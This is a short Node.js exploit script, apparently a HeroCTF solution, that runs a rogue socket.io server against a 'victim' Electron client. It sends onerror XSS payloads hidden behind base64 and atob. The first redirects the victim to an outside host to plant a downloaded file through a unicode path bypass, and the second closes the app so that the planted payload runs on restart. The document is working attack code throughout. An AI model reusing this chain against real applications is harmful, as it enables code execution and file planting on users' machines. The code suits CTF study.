const http = require('http');
const socketIo = require('socket.io');

const server = http.createServer();
let sended = 0;
let first_payload = Buffer.from('document.location.href="http://heroctf.vitemaweed.fr/index.php";').toString('base64');
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

io.on('connection', (socket) => {
    console.log('Victim connected');
    
    if(sended === 0) {
        //Payload to trigger the arbitrary file download with unicode bypass to store our file where we want
        socket.emit('response',`USER: <img src=x onerror='eval(atob(/${first_payload}/.source))'>`);
        sended += 1;
    } else {
        //Payload to crash the electron app and force it to restart when we send another report, triggering our payload
        socket.emit('response', `USER: <img src=x onerror='eval(atob(/d2luZG93LmNsb3NlKCk7/.source))'>`);
    }
    socket.on('message', (data) => {
        console.log(data);
    });

    socket.on('disconnect', () => {
        console.log('Victim disconnected');
    });
});

const port = 4444;

server.listen(port, "0.0.0.0", () => {
    console.log(`Rogue socket.io server listening on http://0.0.0.0:${port}`);
});
